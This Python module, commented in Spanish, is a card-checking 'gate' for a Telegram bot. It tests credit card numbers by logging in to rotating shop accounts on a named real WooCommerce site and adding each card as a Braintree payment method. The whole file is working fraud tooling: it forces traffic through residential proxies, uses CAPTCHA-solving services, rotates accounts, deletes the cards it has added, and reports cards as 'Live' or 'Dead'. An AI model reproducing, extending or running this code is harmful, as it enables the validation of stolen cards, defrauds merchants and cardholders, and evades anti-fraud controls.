#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TNS Braintree Vault — teamnonstop.co via 22-09/bt_addpm.py (subproceso aislado).

Interfaz Hades:
  async def tns_gate_check(card_data, user_id=None) -> {"status","message"}
  async def tns_gate_check_multiple(cards, user_id=None, callback=None) -> [dict]

Contrato Telegram:
  - Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv (15-16 digitos). aaaa 2000-2099 -> yy.
  - El vault NO tiene campo CVV (solo postalCode): el CVV se valida pero no se envia;
    el campo postal usa TNS_DEFAULT_ZIP (default 10001).
  - La respuesta muestra la tarjeta COMPLETA tal como se envio (sin censurar).
  - Sanitizacion: al usuario solo llegan textos allowlist; todo lo interno
    (proxy, tokens, cookies, tracebacks, HTML) queda en log servidor.

Cuentas Woo: MANUALES en data/gates/tns_accounts.txt (formato user|pass, chmod 600).
Este modulo NO crea ni modifica cuentas; si falta el archivo -> CONFIG_ERROR -> Error generico.
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import sys
from collections import defaultdict
from itertools import cycle

# Skill atenea-gateway: carga .env + .env.tns para que IPROYAL_*/CAPSOLVER/TNS_*
# esten disponibles aunque el proceso solo haga load_dotenv(".env").
try:
    from dotenv import load_dotenv as _load_dotenv
    _BASE_PRE = os.path.dirname(os.path.abspath(__file__))
    _load_dotenv(os.path.join(_BASE_PRE, ".env"), override=False)
    _load_dotenv(os.path.join(_BASE_PRE, ".env.tns"), override=False)
except Exception:
    pass

_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
_CANDIDATES = [
    os.environ.get("TNS_WORKER", ""),
    os.path.join(_BASE_DIR, "tns_worker", "bt_addpm.py"),
    os.path.join(_BASE_DIR, "22-09", "bt_addpm.py"),
]
WORKER = next((c for c in _CANDIDATES if c and os.path.isfile(c)),
              os.path.join(_BASE_DIR, "tns_worker", "bt_addpm.py"))


def _resolve_accounts_file() -> str:
    """Resuelve a ruta absoluta.

    Relativa se resuelve contra el cwd (el servicio systemd arranca en la
    raíz del proyecto, donde vive data/gates/tns_accounts.txt).
    """
    raw = os.environ.get("TNS_ACCOUNTS_FILE", "data/gates/tns_accounts.txt") or \
        "data/gates/tns_accounts.txt"
    if os.path.isabs(raw):
        return raw
    return os.path.join(os.getcwd(), raw)


ACCOUNTS_FILE = _resolve_accounts_file()
DEFAULT_ZIP = os.environ.get("TNS_DEFAULT_ZIP", "10001")
PER_CARD_TIMEOUT = int(os.environ.get("TNS_PER_CARD_TIMEOUT", "240"))
CLEAN_AFTER = os.environ.get("TNS_DELETE_AFTER", "1") == "1"

LOGIN_URL = os.environ.get("TNS_LOGIN_URL", "https://teamnonstop.co/shop-2/my-account/payment-methods/")
ADDPM_URL = os.environ.get("TNS_ADDPM_URL", "https://teamnonstop.co/shop-2/my-account/add-payment-method/")
TS_SITEKEY = os.environ.get("TNS_TS_SITEKEY", "0x4AAAAAACvhqoVFgXZeVT7y")
V3_SITEKEY = os.environ.get("TNS_V3_SITEKEY", "6LdIU9cqAAAAADyH-LFElSrrvEFsIGeqwBT-LW5F")

# Browser pesado: 1 check global a la vez, 1 por usuario.
_tns_global_sem = asyncio.Semaphore(int(os.environ.get("TNS_GLOBAL_CONCURRENCY", "1")))
_user_sems: dict[int, asyncio.Semaphore] = {}
_user_sems_lock = asyncio.Lock()
_account_cycle = None
_account_cycle_lock = asyncio.Lock()

user_request_count: defaultdict[int, int] = defaultdict(int)
active_requests_count = 0

# Modo estricto: al usuario SOLO Live/Dead/Error genericos. Nada de pasarela.
# Todo detalle (gateway rejected, risk_threshold, processor, HTML, URLs) queda en log servidor.
REASON_ALLOWLIST: tuple = ()

GENERIC_ERROR = "Error avisar a un administrador"
GENERIC_DECLINED = "Tarjeta declinada"
GENERIC_APPROVED = "Payment method successfully added."


def normalize_card(card_data: str):
    """Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv. Devuelve (pan, mm2, yy2, cvv, original) o None."""
    try:
        original = (card_data or "").strip()
        parts = [p.strip() for p in original.split("|")]
        if len(parts) != 4:
            return None
        pan, mes, ano, cvv = parts
        if not pan.isdigit() or len(pan) not in (15, 16):
            return None
        if not mes.isdigit() or not (1 <= int(mes) <= 12):
            return None
        mm2 = mes.zfill(2)
        if not ano.isdigit():
            return None
        if len(ano) == 4:
            if not (2000 <= int(ano) <= 2099):
                return None
            yy2 = ano[-2:]
        elif len(ano) == 2:
            yy2 = ano
        else:
            return None
        cvv_low = cvv.lower()
        if cvv_low in ("rnd", "xxx", "xxxx"):
            cvv = "000"
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            return None
        return pan, mm2, yy2, cvv, original
    except Exception:
        return None


def _sanitize_reason(reason: str) -> str:
    # Estricto: log real solo servidor, al usuario siempre generico. No fuga pasarela.
    if reason:
        print(f"Reason REAL TNS (oculto): {str(reason)[:200]}")
    return GENERIC_DECLINED


def _check_worker_config() -> str | None:
    """Validacion temprana (skill atenea-gateway: Gateway.verify fail-fast).

    Devuelve None si todo OK, o string con causa REAL solo para log servidor.
    Al usuario siempre le llega GENERIC_ERROR (contrato Telegram).
    """
    if not os.path.isfile(WORKER):
        return f"worker missing {WORKER}"
    if not os.path.isfile(ACCOUNTS_FILE):
        return f"accounts file missing {ACCOUNTS_FILE} (crear data/gates/tns_accounts.txt user|pass, chmod 600)"
    try:
        size = os.path.getsize(ACCOUNTS_FILE)
        if size == 0:
            return f"accounts file empty {ACCOUNTS_FILE}"
    except OSError as e:
        return f"accounts file unreadable {ACCOUNTS_FILE}: {type(e).__name__}"
    from bot.config import (
        IPROYAL_HOST as _IPROYAL_HOST,
        IPROYAL_PASS as _IPROYAL_PASS,
        IPROYAL_USER as _IPROYAL_USER,
    )

    missing = [k for k, v in (
        ("IPROYAL_USER", _IPROYAL_USER),
        ("IPROYAL_PASS", _IPROYAL_PASS),
        ("IPROYAL_HOST", _IPROYAL_HOST),
        ("CAPSOLVER_API_KEY", os.environ.get("CAPSOLVER_API_KEY")),
        ("ANTICAPTCHA_API_KEY", os.environ.get("ANTICAPTCHA_API_KEY")),
    ) if not v]
    if missing:
        return f"missing env {','.join(missing)} (revisar .env + .env.tns)"
    return None


def _map_outcome(outcome: dict) -> dict:
    """Mapea JSON del worker a formato Hades. Solo Live/Dead/Error genericos al usuario."""
    try:
        status = (outcome.get("status") or "UNKNOWN").upper()
        if status == "APPROVED":
            return {"status": "✅ Live",
                    "message": GENERIC_APPROVED}
        if status == "DECLINED":
            reason = outcome.get("reason", "") or outcome.get("notices", "") or ""
            return {"status": "❌ Dead",
                    "message": _sanitize_reason(reason)}
        if status in ("DELETED", "NO_METHOD"):
            return {"status": "✅ Live", "message": GENERIC_APPROVED} \
                if status == "DELETED" else \
                {"status": "⚠️ Error", "message": GENERIC_ERROR}
        # Skill atenea: ERROR/TIMEOUT/CONFIG distinguibles en servidor, genericos al usuario.
        real = {k: str(v)[:200] for k, v in (outcome or {}).items()
                if k in ("status", "message", "account", "url")}
        print(f"Error REAL TNS outcome (oculto): {real}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}
    except Exception as e:
        print(f"Error REAL TNS map (oculto): {e}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}


async def _get_user_sem(user_id: int) -> asyncio.Semaphore:
    async with _user_sems_lock:
        sem = _user_sems.get(user_id)
        if sem is None:
            sem = asyncio.Semaphore(1)
            _user_sems[user_id] = sem
        return sem


async def _next_account():
    """Round-robin sobre data/gates/tns_accounts.txt (manual). Devuelve (user, pass) o None."""
    global _account_cycle
    async with _account_cycle_lock:
        if _account_cycle is None:
            try:
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as fh:
                    accs = []
                    for line in fh:
                        line = line.strip()
                        if not line or "|" not in line:
                            continue
                        u, _, p = line.partition("|")
                        u, p = u.strip(), p.strip()
                        if u and p:
                            accs.append((u, p))
            except FileNotFoundError:
                print(f"Error REAL TNS (oculto): accounts file missing {ACCOUNTS_FILE}")
                return None
            if not accs:
                print("Error REAL TNS (oculto): accounts file empty")
                return None
            _account_cycle = cycle(accs)
        return next(_account_cycle)


def reset_account_pool():
    """Recarga el pool (usar tras editar manualmente el archivo de cuentas)."""
    global _account_cycle
    _account_cycle = None


async def _run_worker_once(pan: str, mm: str, yy: str, login_user: str, login_pass: str,
                           delete_only: bool = False) -> dict:
    """Ejecuta tns_worker/bt_addpm.py como subproceso aislado. Devuelve dict Hades."""
    # Fail-fast: no quemar 240s de timeout si la config esta incompleta.
    cfg_err = _check_worker_config()
    if cfg_err:
        print(f"Error REAL TNS (oculto): {cfg_err}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}
    env = dict(os.environ)
    # El worker exige IPROYAL_* (proxy obligatorio, nunca directo). Sin proxy -> CONFIG_ERROR.
    # Se inyectan los valores del bloque nuevo del .env para no depender de los
    # nombres viejos que el worker hereda del entorno.
    from bot.config import (
        IPROYAL_HOST as _IPROYAL_HOST,
        IPROYAL_PASS as _IPROYAL_PASS,
        IPROYAL_USER as _IPROYAL_USER,
    )
    from bot.services.proxies import STICKY_LIFETIME as _IPROYAL_LIFETIME

    env["IPROYAL_USER"] = _IPROYAL_USER
    env["IPROYAL_PASS"] = _IPROYAL_PASS
    env["IPROYAL_HOST"] = _IPROYAL_HOST
    env["IPROYAL_LIFETIME"] = _IPROYAL_LIFETIME
    env["LOGIN_URL"] = LOGIN_URL
    env["ADDPM_URL"] = ADDPM_URL
    env["TS_SITEKEY"] = TS_SITEKEY
    env["V3_SITEKEY"] = V3_SITEKEY
    env["LOGIN_USER"] = login_user
    env["LOGIN_PASS"] = login_pass
    env["DELETE_ONLY"] = "1" if delete_only else "0"
    if not delete_only:
        # El form pide postal, no CVV: el CVV de Telegram se ignora, se usa ZIP fijo.
        env["CARD"] = f"{pan}|{mm}|{yy}|{DEFAULT_ZIP}"
    env.pop("ACCOUNTS_FILE", None)
    try:
        proc = await asyncio.create_subprocess_exec(
            sys.executable, WORKER,
            env=env, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=PER_CARD_TIMEOUT)
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except Exception:
                pass
            print("Error REAL TNS (oculto): worker timeout")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}
        text = out.decode("utf-8", "replace") or ""
        # Skill atenea: recolectar TODOS los JSON, priorizar APPROVED > DECLINED > resto.
        # (Antes tomaba el ultimo JSON a ciegas y colapsaba CONFIG_ERROR a generico sin log.)
        outcomes: list[dict] = []
        for line in text.splitlines():
            line = line.strip()
            if line.startswith("{") and line.endswith("}"):
                try:
                    obj = json.loads(line)
                    if isinstance(obj, dict) and obj.get("status"):
                        outcomes.append(obj)
                except Exception:
                    continue
        if not outcomes:
            print(f"Error REAL TNS (oculto): worker sin JSON status={proc.returncode} tail={text[-300:]}")
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}
        rank = {"APPROVED": 0, "DELETED": 1, "DECLINED": 2, "NO_METHOD": 3}
        outcomes.sort(key=lambda o: rank.get((o.get("status") or "").upper(), 9))
        outcome = outcomes[0]
        if len(outcomes) > 1 or outcome.get("status", "").upper() not in (
                "APPROVED", "DECLINED", "DELETED", "NO_METHOD"):
            print(f"Error REAL TNS outcome (oculto): status={outcome.get('status')} "
                  f"msg={str(outcome.get('message'))[:150]} n={len(outcomes)}")
        return _map_outcome(outcome)
    except Exception as e:
        print(f"Error REAL TNS worker (oculto): {type(e).__name__}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}


async def tns_gate_check(card_data: str, user_id: int | None = None) -> dict:
    """Verifica 1 tarjeta. La respuesta incluye la CC completa tal como se envio."""
    global active_requests_count
    if user_id is None:
        user_id = 0
    norm = normalize_card(card_data)
    if norm is None:
        return {"status": "❌ Dead", "message": "Fechas Invalidas"}
    # Fail-fast de config (skill atenea: no encolar browser si falta base).
    cfg_err = _check_worker_config()
    if cfg_err:
        print(f"Error REAL TNS (oculto): {cfg_err}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}
    pan, mm, yy, _cvv, original = norm
    user_sem = await _get_user_sem(user_id)
    async with _tns_global_sem:
        async with user_sem:
            user_request_count[user_id] += 1
            active_requests_count += 1
            try:
                account = await _next_account()
                if not account:
                    return {"status": "⚠️ Error", "message": GENERIC_ERROR}
                login_user, login_pass = account
                result = await _run_worker_once(pan, mm, yy, login_user, login_pass)
                if result.get("status") == "✅ Live" and CLEAN_AFTER:
                    # Limpieza best-effort del metodo agregado; no cambia el resultado.
                    try:
                        await _run_worker_once(pan, mm, yy, login_user, login_pass,
                                               delete_only=True)
                    except Exception as e:
                        print(f"Error REAL TNS cleanup (oculto): {type(e).__name__}")
                return result
            finally:
                user_request_count[user_id] -= 1
                active_requests_count -= 1


async def tns_gate_check_multiple(cards_data: list, user_id: int | None = None,
                                  callback=None) -> list:
    """Verifica N tarjetas EN SERIE (browser pesado). Llama callback(index, result, card, uid)."""
    if user_id is None:
        user_id = 0
    cards = [c.strip() for c in (cards_data or []) if (c or "").strip()][:5]
    results = []
    for i, card in enumerate(cards):
        try:
            res = await tns_gate_check(card, user_id)
        except Exception as e:
            print(f"Error REAL TNS mass (oculto): {type(e).__name__}")
            res = {"status": "⚠️ Error", "message": GENERIC_ERROR}
        results.append(res)
        if callback:
            try:
                await callback(i, res, card, user_id)
            except Exception as e:
                print(f"Error REAL TNS callback (oculto): {type(e).__name__}")
    return results
